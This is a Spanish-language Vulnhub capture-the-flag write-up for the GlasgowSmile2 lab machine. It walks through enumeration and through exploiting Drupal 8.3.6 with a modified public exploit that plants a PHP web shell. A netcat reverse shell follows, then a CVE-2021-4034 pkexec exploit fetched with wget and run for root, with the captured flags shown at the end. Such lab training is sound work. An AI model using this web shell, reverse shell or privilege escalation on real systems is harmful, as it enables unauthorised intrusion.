---
title: GlasgowSmile2 Writeup - Vulnhub
date: 2025-03-13
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, GlasgowSmile2, OSCP Prep, droopescan, Drupal]
image:
  path: /assets/img/commons/vulnhub/GlasgowSmile2/portada.png
---

Anterior [*OSCP Lab 20*](https://lvs3c.github.io/posts/OSCP-InfoSecPrep/)

¡Saludos!

**`OSCP Lab 21`**

En este writeup, realizaremos la máquina [**GlasgowSmile 2**](https://www.vulnhub.com/entry/glasgow-smile-2,513/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- Explotar **CMS Drupal** ganando acceso a la máquina.
- Explotar binario **pkexec** ganando acceso root y listando todas las flags.

Let's jump in!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.54     00:0c:29:df:f3:13       VMware, Inc.
10.11.12.200    00:50:56:e9:ee:69       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.418 seconds (105.87 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.54
PING 10.11.12.54 (10.11.12.54) 56(84) bytes of data.
64 bytes from 10.11.12.54: icmp_seq=1 ttl=64 time=0.529 ms

--- 10.11.12.54 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.529/0.529/0.529/0.000 ms
```

## Escaneo - Enumeración

---

A continuación, realizamos un escaneo con `Nmap`.

```bash
❯ sudo nmap -p- -sCV 10.11.12.54 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 23:29 -03
Nmap scan report for 10.11.12.54
Host is up (0.0018s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b7:e0:26:c4:a8:48:1f:64:bb:e2:87:c2:4a:ec:13:8a (RSA)
|   256 b6:b8:19:ec:2e:06:20:65:be:25:0e:a6:49:7e:0d:f6 (ECDSA)
|_  256 10:99:fa:8d:0d:60:ff:32:4d:6c:a2:28:e4:6e:d8:80 (ED25519)
80/tcp   open     http       Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
83/tcp   open     http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
8080/tcp filtered http-proxy
MAC Address: 00:0C:29:DF:F3:13 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

❯ sudo nmap -p80,83 --script http-enum 10.11.12.54 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 23:33 -03
Nmap scan report for 10.11.12.54
Host is up (0.00024s latency).

PORT   STATE SERVICE
80/tcp open  http
83/tcp open  mit-ml-dev
MAC Address: 00:0C:29:DF:F3:13 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 7.9p1.
- Puerto `80` servidor `Apache httpd 2.4.38`.
- Puerto `83` servidor `Apache httpd 2.4.38`.


### HTTP - 80 - 83

![web80](/assets/img/commons/vulnhub/GlasgowSmile2/web80.png){: .center-image }


Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ sudo nmap -p80,83 --script http-enum 10.11.12.54 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 23:33 -03
Nmap scan report for 10.11.12.54
Host is up (0.00024s latency).

PORT   STATE SERVICE
80/tcp open  http
83/tcp open  mit-ml-dev
MAC Address: 00:0C:29:DF:F3:13 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

No nos trae resultados.

Lanzamos `gobuster` para obtener más información sobre archivos o directorios ocultos.

```bash
❯ gobuster dir -u http://10.11.12.54 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -b 403,404 -x php,txt,html,sh,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.54
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html,sh
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.54/index.html           (Status: 200) [Size: 339]
http://10.11.12.54/javascript           (Status: 301) [Size: 315] [--> http://10.11.12.54/javascript/]
http://10.11.12.54/todo.txt             (Status: 200) [Size: 456]
http://10.11.12.54/joke.sh              (Status: 200) [Size: 1676]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

Validamos el script `joke.sh`

![joke](/assets/img/commons/vulnhub/GlasgowSmile2/joke.png){: .center-image }

Dentro del script obtenmos la url `Glasgow---Smile2`, la cual es un `CMS Drupal v8`.

![web80drupal](/assets/img/commons/vulnhub/GlasgowSmile2/web80drupal.png){: .center-image }

Lanzamos la herramienta `droopescan` para obtener más información.

```bash
❯ droopescan scan drupal -u http://10.11.12.54/Glasgow---Smile2

[+] Possible version(s):
    8.3.6

[+] Possible interesting urls found:
    Default admin - http://10.11.12.54/Glasgow---Smile2/user/login
```

## Explotación

---

Validamos en searchsploit si existe algún exploit sobre la versión.

![searchsploit](/assets/img/commons/vulnhub/GlasgowSmile2/searchsploit.png){: .center-image }

Utilizamos el siguiente [exploit](https://www.exploit-db.com/exploits/44448).

Modificamos el exploit para pasarle una cadena en base64 (con nuestro código php), la cual se desencripta y se guarda en el archivo `rs.php`.

```bash
❯ cat rs.php
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: rs.php
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php system($_GET['c']); ?>
───────┴───────────────────────────────

❯ base64 rs.php
PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pgo=
```

![exploit](/assets/img/commons/vulnhub/GlasgowSmile2/exploit.png){: .center-image }

Ejecutamos.

![rs](/assets/img/commons/vulnhub/GlasgowSmile2/rs.png){: .center-image }

Validamos nuestro archivo y generamos la reverse shell.

![rs2](/assets/img/commons/vulnhub/GlasgowSmile2/rs2.png){: .center-image }
![rs3](/assets/img/commons/vulnhub/GlasgowSmile2/rs3.png){: .center-image }

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.54] 51714
bash: cannot set terminal process group (555): Inappropriate ioctl for device
bash: no job control in this shell
www-data@glasgowsmile2:/var/www/html/Glasgow---Smile2$
```

## Escalación de privilegios

---

Validamos los binarios `SUID`{: .filepath} del sistema.

```bash
www-data@glasgowsmile2:/var/www/html/Glasgow---Smile2$ find / -perm -4000 2>/dev/null
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```

Explotamos el binario `pkexec` mediante [CVE-2021-4034](https://github.com/Almorabea/pkexec-exploit).

Compartimos el exploit con la máquina, lo ejecutamos y somos root. 

Listamos todas las flags.

```bash
www-data@glasgowsmile2:/tmp$ wget 10.11.12.10/CVE-2021-4034.py
--2025-03-12 20:25:11--  http://10.11.12.10/CVE-2021-4034.py
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3068 (3.0K) [text/x-python]
Saving to: 'CVE-2021-4034.py'

CVE-2021-4034.py                                                 100%[==========================================================================================================================================================>]   3.00K  --.-KB/s    in 0s

2025-03-12 20:25:11 (371 MB/s) - 'CVE-2021-4034.py' saved [3068/3068]

www-data@glasgowsmile2:/tmp$ chmod +x CVE-2021-4034.py
www-data@glasgowsmile2:/tmp$ ./CVE-2021-4034.py
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f365e0634f0 at 0x7f365d827a20>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cd /home
# cd riddler
# ls
theworldmustbeburned  user.txt
# cat user.txt
GS2{52ed6cddca27b44be716f9b856744008}
# cd ../bane
# ls
public_html  riddler.jpg  user2.txt
# cat user2.txt
GS2{5c851b5e9ec996b38b7d0a544013380e}
# cd ../carnage
# ls
get_out  user3.txt
# cat user3.txt
GS2{988535ad480d747ef00c705541d08a6e}
# cd ../venom
# ls
Ladies_and_Gentlmen  user4.txt
# cat user4.txt
GS2{b79aba0d627bcd2025e35c2a192e1d51}
#
# cd /root
# ls
root.txt  task.sh
# cat root.txt
      ....        .         ..                .x+=:.                                                     ...                                .          ..
   .x88" `^x~  xH(`   x .d88"                z`    ^%                            x=~                 .x888888hx    :                       @88>  x .d88"               .--~*teu.
  X888   x8 ` 8888h    5888R                    .   <k                    u.    88x.   .e.   .e.    d88888888888hxx     ..    .     :      %8P    5888R               dF     988Nx
 88888  888.  %8888    '888R         u        .@8Ned8"      uL      ...ue888b  '8888X.x888:.x888   8" ... `"*8888%`   .888: x888  x888.     .     '888R        .u    d888b   `8888>
<8888X X8888   X8?      888R      us888u.   .@^%8888"   .ue888Nc..  888R Y888r  `8888  888X '888k !  "   ` .xnxx.    ~`8888~'888X`?888f`  .@88u    888R     ud8888.  ?8888>  98888F
X8888> 488888>"8888x    888R   .@88 "8888" x88:  `)8b. d88E`"888E`  888R I888>   X888  888X  888X X X   .H8888888%:    X888  888X '888>  ''888E`   888R   :888'8888.  "**"  x88888~
X8888>  888888 '8888L   888R   9888  9888  8888N=*8888 888E  888E   888R I888>   X888  888X  888X X 'hn8888888*"   >   X888  888X '888>    888E    888R   d888 '88%"       d8888*`
?8888X   ?8888>'8888X   888R   9888  9888   %8"    R88 888E  888E   888R I888>   X888  888X  888X X: `*88888%`     !   X888  888X '888>    888E    888R   8888.+"        z8**"`   :
 8888X h  8888 '8888~   888R   9888  9888    @8Wou 9%  888E  888E  u8888cJ888   .X888  888X. 888~ '8h.. ``     ..x8>   X888  888X '888>    888E    888R   8888L        :?.....  ..F
  ?888  -:8*"  <888"   .888B . 9888  9888  .888888P`   888& .888E   "*888*P"    `%88%``"*888Y"     `88888888888888f   "*88%""*88" '888!`   888&   .888B . '8888c. .+  <""888888888~
   `*88.      :88%     ^*888%  "888*""888" `   ^"F     *888" 888&     'Y"         `~     `"         '%8888888888*"      `~    "    `"`     R888"  ^*888%   "88888%    8:  "888888*
      ^"~====""`         "%     ^Y"   ^Y'               `"   "888E                                     ^"****""`                            ""      "%       "YP'     ""    "**"`
                                                       .dWi   `88E
                                                       4888~  J8%
                                                        ^"===*"`


What do you get when you cross a mentally-ill loner with a society that abandons him and treats him like trash!?
I'll tell you what you get:

YOU GET WHAT YOU FUCKING DESERVE!


Congratulations you pwned GS2!

GS2{df135baa6a216b6fe05f57a1efc1c90f}

If you liked my Virtual Machines, offer me a coffee, I'll work on the next one!

https://www.buymeacoffee.com/mindsflee

mindsflee




#
```

Hope it helps!